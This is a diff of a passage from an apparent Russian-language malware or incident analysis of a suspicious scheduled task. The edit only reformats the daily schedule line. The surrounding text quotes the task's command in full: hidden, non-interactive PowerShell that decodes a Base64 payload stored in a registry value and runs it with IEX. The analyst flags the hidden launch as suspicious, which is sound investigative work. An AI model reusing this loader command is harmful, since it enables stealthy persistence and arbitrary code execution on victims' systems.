@@ -259,10 +259,7 @@ Flags: CommitCharge: 1, PrivateMemory: 1, Protection: 6
 Дата и время: 2019-03-10, 05:56:46  
 Автор изменений: Support  
 Триггер привязан к календарю: 2019-03-10, 09:00:00  
-Сканирование запланировано в ежедневном режиме:  
-<ScheduleByDay>  
-<DaysInterval>1</DaysInterval>  
-</ScheduleByDay>  
+Сканирование запланировано в ежедневном режиме
 Процесс запускается консольной команой  
 <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command> <Arguments>-NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"</Arguments>  
 Подозрительным выглядит запуск в скрытом режиме.  
